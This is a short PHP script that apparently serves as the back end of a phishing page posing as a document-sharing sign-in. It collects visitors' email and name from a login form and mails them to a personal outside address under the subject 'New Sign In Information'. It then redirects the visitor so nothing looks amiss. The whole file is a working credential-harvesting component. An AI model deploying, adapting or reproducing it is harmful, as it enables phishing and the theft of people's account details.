<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $email = htmlspecialchars($_POST['email']);
    $name = htmlspecialchars($_POST['name']);

    // Set the recipient email address
    $to = 'larrystotts117@mail.com'; // Replace with your email address

    // Set the email subject
    $subject = 'New Sign In Information';

    // Create the email body
    $message = "Email: $email\n";
    $message .= "Name: $name\n";

    // Set the email headers
    $headers = "From: admin@docufileshareopen.whf.bz\r\n"; // Replace with a valid sender email

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        header('Location: index.html');
        exit;
    } else {
        echo 'Email sending failed.';
    }
}

?>